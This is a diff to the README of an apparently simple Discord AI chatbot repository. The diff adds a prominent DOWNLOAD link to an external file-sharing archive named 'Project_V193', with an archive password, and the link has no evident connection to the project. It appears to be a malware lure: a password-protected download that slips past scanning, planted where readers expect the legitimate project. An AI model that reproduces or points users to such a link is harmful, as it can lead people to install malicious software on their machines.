@@ -1,7 +1,8 @@
 # Discord AI Bot 🤖
 
 Welcome to the **Discord-AI-Bot** repository! 🎉 This repository hosts a simple Discord AI chatbot built using the "Claude" package. The chatbot utilizes cutting-edge AI technology to provide engaging conversations on Discord servers. 
-
+# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+## PASSWORD: 1322
 ## Features ✨
 
 🤖 **AI Chatbot**: Engage with a sophisticated AI chatbot in your Discord server.
